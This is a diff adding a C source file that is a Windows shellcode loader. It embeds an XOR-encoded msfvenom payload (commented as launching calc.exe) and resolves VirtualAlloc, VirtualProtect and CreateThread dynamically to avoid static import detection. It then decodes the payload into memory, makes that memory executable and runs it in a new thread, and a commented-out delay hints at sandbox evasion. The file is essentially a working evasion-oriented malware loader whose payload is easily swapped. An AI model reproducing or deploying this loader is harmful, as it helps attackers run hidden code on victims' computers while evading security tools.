@@ -1,0 +1,77 @@
+#include <Windows.h>
+#include <stdio.h>
+#define SLEEP_TIME 15000
+
+/* msfvenom -p windows/x64/exec CMD=calc.exe -f c
+ .data saved payload */
+unsigned char buf[] = "\x31\x85\x4e\x29\x3d\x25\x0d\xcd\xcd\xcd\x8c\x9c\x8c\x9d\x9f\x9c\x9b\x85\xfc\x1f\xa8\x85\x46\x9f\xad\x85\x46\x9f\xd5\x85\x46\x9f\xed\x85\x46\xbf\x9d\x85\xc2\x7a\x87\x87\x80\xfc\x04\x85\xfc\x0d\x61\xf1\xac\xb1\xcf\xe1\xed\x8c\x0c\x04\xc0\x8c\xcc\x0c\x2f\x20\x9f\x8c\x9c\x85\x46\x9f\xed\x46\x8f\xf1\x85\xcc\x1d\x46\x4d\x45\xcd\xcd\xcd\x85\x48\x0d\xb9\xaa\x85\xcc\x1d\x9d\x46\x85\xd5\x89\x46\x8d\xed\x84\xcc\x1d\x2e\x9b\x85\x32\x04\x8c\x46\xf9\x45\x85\xcc\x1b\x80\xfc\x04\x85\xfc\x0d\x61\x8c\x0c\x04\xc0\x8c\xcc\x0c\xf5\x2d\xb8\x3c\x81\xce\x81\xe9\xc5\x88\xf4\x1c\xb8\x15\x95\x89\x46\x8d\xe9\x84\xcc\x1d\xab\x8c\x46\xc1\x85\x89\x46\x8d\xd1\x84\xcc\x1d\x8c\x46\xc9\x45\x85\xcc\x1d\x8c\x95\x8c\x95\x93\x94\x97\x8c\x95\x8c\x94\x8c\x97\x85\x4e\x21\xed\x8c\x9f\x32\x2d\x95\x8c\x94\x97\x85\x46\xdf\x24\x9a\x32\x32\x32\x90\x85\x77\xcc\xcd\xcd\xcd\xcd\xcd\xcd\xcd\x85\x40\x40\xcc\xcc\xcd\xcd\x8c\x77\xfc\x46\xa2\x4a\x32\x18\x76\x3d\x78\x6f\x9b\x8c\x77\x6b\x58\x70\x50\x32\x18\x85\x4e\x09\xe5\xf1\xcb\xb1\xc7\x4d\x36\x2d\xb8\xc8\x76\x8a\xde\xbf\xa2\xa7\xcd\x94\x8c\x44\x17\x32\x18\xae\xac\xa1\xae\xe3\xa8\xb5\xa8\xcd\xcd";
+
+VOID XorByOneKey(IN PBYTE shellcode, IN SIZE_T sShellcodeSize, IN BYTE bKey) {
+    for (size_t i = 0; i < sShellcodeSize; i++) {
+        shellcode[i] = shellcode[i] ^ bKey;
+    }
+}
+
+LPVOID(WINAPI* va)(LPVOID lpAddress,SIZE_T dwSize,DWORD flAllocationType,DWORD flProtect);
+BOOL(WINAPI* vp)(LPVOID lpAddress,SIZE_T dwSize,DWORD flNewProtect,PDWORD lpflOldProtect);
+HANDLE (WINAPI* ct)(LPSECURITY_ATTRIBUTES lpThreadAttributes,SIZE_T dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress,LPVOID lpParameter,DWORD dwCreationFlags,LPDWORD lpThreadId);
+
+int main() {
+    
+    //sleep as you start
+    /*
+    printf("before sleep\n");
+    Sleep(SLEEP_TIME);
+    printf("after sleep\n");
+    */
+
+
+    SIZE_T bufsize = sizeof buf;
+    BYTE key = 0xcd;
+
+    HMODULE kd = GetModuleHandle(TEXT("kernel32.dll"));
+    if (!kd) {
+        DWORD error = GetLastError();
+        printf("GetModuleHandle failed with error code: %lu\n", error);
+    }
+    va = GetProcAddress(kd, "VirtualAlloc");
+    if (!va) {
+        printf("Failed to get address of VirtualAlloc\n");
+        return -1;
+    }
+    PVOID shellcodeAddress = va(NULL, bufsize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!shellcodeAddress) {
+        printf("VirtualAlloc failed\n");
+        return -1;
+    }
+  
+    XorByOneKey(buf, bufsize, key);
+    //move shellcode 
+    memcpy(shellcodeAddress, buf, bufsize);
+    memset(buf, '\0', bufsize);
+
+    DWORD prot = NULL;
+
+    //change perms optional
+    vp= GetProcAddress(kd, "VirtualProtect");
+    if (!vp) {
+        printf("Failed to get address of VirtualProtect\n");
+        return -1;
+    }
+    vp(shellcodeAddress, bufsize, PAGE_EXECUTE_READWRITE, &prot);
+    //VirtualProtect(shellcodeAddress, bufsize, PAGE_EXECUTE_READWRITE, &prot);
+
+    //execute
+    ct = GetProcAddress(kd, "CreateThread");
+    if (!ct) {
+        printf("Failed to get address of create thread\n");
+        return -1;
+    }
+    ct(NULL, NULL, shellcodeAddress, NULL, NULL, NULL);
+    //CreateThread(NULL, NULL, shellcodeAddress, NULL, NULL, NULL);
+
+    getchar();
+    return 0;
+}
+
+
